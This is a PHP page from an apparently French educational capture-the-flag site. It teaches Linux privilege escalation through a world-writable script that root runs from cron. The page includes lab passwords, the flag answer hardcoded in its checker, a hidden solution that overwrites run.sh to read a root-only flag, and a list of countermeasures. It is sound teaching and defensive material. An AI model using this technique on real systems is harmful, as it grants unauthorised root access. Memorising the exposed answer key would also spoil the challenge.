<?php
require $_SERVER['DOCUMENT_ROOT'] . "/core/auth.php"; // auth universel
include $_SERVER['DOCUMENT_ROOT'] . "/core/header.php"; // header universel
?>

<div class="menu">
    <a href="../index_script.php">⬅ Retour au script</a>
</div>

<h2>Escalade de privilèges via un cron root</h2>

<p>
    Vous disposez d’un accès SSH à une machine ilinux en tant qu’utilisateur <code>ciel</code>i (mdp : choupette).  
    Un script <code>run.sh</code> vous appartient… mais il est exécuté régulièrement par <strong>root</strong> via un cron.  
</p>

<!-- Formulaire pour vérifier la réponse -->
<div style="margin-top: 30px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; max-width: 500px;">
    <h3>Vérifier votre réponse</h3>
    <form method="post">
        <label for="answer">Entrez la réponse :</label><br>
        <input type="text" name="answer" id="answer" style="width: 100%; padding: 5px; margin-top: 5px;" required><br><br>
        <input type="submit" value="Vérifier" style="padding: 5px 10px;">
    </form>

    <?php
    // Vérification de la réponse
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userAnswer = trim($_POST['answer']);
        $correctAnswer = "La liberté c'est l'esclavage."; // <-- Flag réel

        if ($userAnswer === $correctAnswer) {
            echo '<p style="color: green; font-weight: bold;">OK ! Bravo ✅</p>';
        } else {
            echo '<p style="color: red; font-weight: bold;">NOK ! Dommage ❌</p>';
        }
    }
    ?>
</div>

<div class="challenge-container" style="display: flex; gap: 20px; margin-top: 20px;">

    <!-- Colonne gauche : Commandes utiles -->
    <div class="commands" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Étapes à suivre</h3>
        <pre>
# lancer le container
docker compose up -d

# Se connecter en ssh au container mdp : toor
ssh ciel@localhost -p 2222

# A LA FIN DU CHALLENGE : ARRÊTER ET SUPPRIMER LE CONTAINER 
docker compose down

# Effacer la connexion ssh
ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
        </pre>
    

    </div>

    <!-- Colonne droite : Fichiers à télécharger -->
    <div class="files" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Fichiers à télécharger</h3>
        <ul>
            <!--<li><a href="/formation/2026/00-script/01-cron/t00-ch01-cron.tar" download>t00-ch01-cron.tar</a></li>-->
	    <li><a href="/formation/2026/00-script/01-cron/docker-compose.yml">docker-compose.yml</a></li>	
	</ul>
    </div>

</div>

<!-- BOUTON POUR AFFICHER LA SOLUTION -->
<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">

    <button onclick="toggleBox()" 
            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
        Afficher des éléments de correction (tricheur)
    </button>

    <div id="boxContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">

        <p>
        Erreur de l'administrateur : le ficheir run.sh est accessible en écriture pour tout le monde. Et est executer en roor via cron. Il suffit de l modifier pour executer ce que l'on souhaite.
        </p>

        <pre style="white-space: pre-wrap; width: 100%;">
# Écraser le script exécuté par root
echo "cat /home/ciel/flag.txt > /home/ciel/pwned.txt" > ~/run.sh
ou
encore
chmod 777 /home/ciel/flag.txt
# Attendre le cron (1 minute)
sleep 60

# Lire le flag
cat ~/pwned.txt
ou
cat ~/flag.txt
        </pre>

    </div>
</div>

<script>
function toggleBox() {
    const box = document.getElementById("boxContent");
    box.style.display = box.style.display === "none" ? "block" : "none";
}
</script>

<!-- BOUTON POUR AFFICHER LES CONTRE-MESURES -->
<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">

    <button onclick="toggleCounter()"
            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
        Afficher les contre‑mesures et le lien avec le BTS CIEL
    </button>

    <div id="counterContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">

	<ul>
	<li><strong>Éviter les scripts modifiables</strong> : aucun script ou fichier exécuté par cron ne doit être modifiable par un utilisateur non privilégié.</li>
	<li><strong>Utiliser des chemins absolus</strong> : dans les scripts lancés par cron, toujours appeler les binaires via leur chemin complet (ex. <code>/usr/bin/rsync</code>).</li>
	<li><strong>Définir un PATH minimal</strong> : cron utilise un PATH réduit ; il doit être explicitement défini dans les scripts pour éviter l’exécution de binaires malveillants.</li>
	<li><strong>Interdire les répertoires sensibles dans PATH</strong> : ne jamais inclure <code>/tmp</code>, <code>/home</code> ou tout répertoire modifiable par un utilisateur.</li>
	<li><strong>Vérifier les permissions des répertoires</strong> : les répertoires contenant des scripts cron (ex. <code>/etc/cron.d</code>, <code>/etc/cron.daily</code>) doivent être en écriture uniquement pour root.</li>
	<li><strong>Éviter les jokers dangereux</strong> : les commandes utilisant <code>*</code> ou des expansions de fichiers peuvent être détournées (ex. attaques via <code>--checkpoint-action</code> sur tar).</li>
	<li><strong>Utiliser systemd timers</strong> : préférer des timers systemd, plus contrôlables et auditables que cron.</li>
	<li><strong>Journaliser et auditer</strong> : surveiller les logs <code>/var/log/syslog</code> ou <code>/var/log/cron</code> pour détecter des comportements anormaux.</li>
	<li><strong>Limiter les droits des comptes exécutant cron</strong> : si possible, exécuter les tâches avec un utilisateur dédié aux permissions minimales.</li>
	<li><strong>Vérifier les dépendances</strong> : tout fichier appelé par un script cron (config, binaire, clé, répertoire) doit être protégé contre l’écriture.</li>
	</ul>
        <hr>

        <h3>Lien avec le BTS</h3>

        <ul>
	 <li><strong>C10 - EXPLOITER UN RÉSEAU INFORMATIQUE</strong></li>
                <li>Langages de Scripts</li>
		<li> Scripts UNIX (bash/zsh)</li>
		
                <li><strong>C11 - MAINTENIR UN RESEAU INFORMATIQUE </strong></li>
                <li> Droits d’accès</li> 
	</ul>


    </div>
</div>

<script> function toggleCounter() { 
const box = document.getElementById("counterContent"); box.style.display = box.style.display === "none" ? "block" : "none"; } 
</script>


<?php
include $_SERVER['DOCUMENT_ROOT'] . "/core/footer.php"; // footer universel
?>

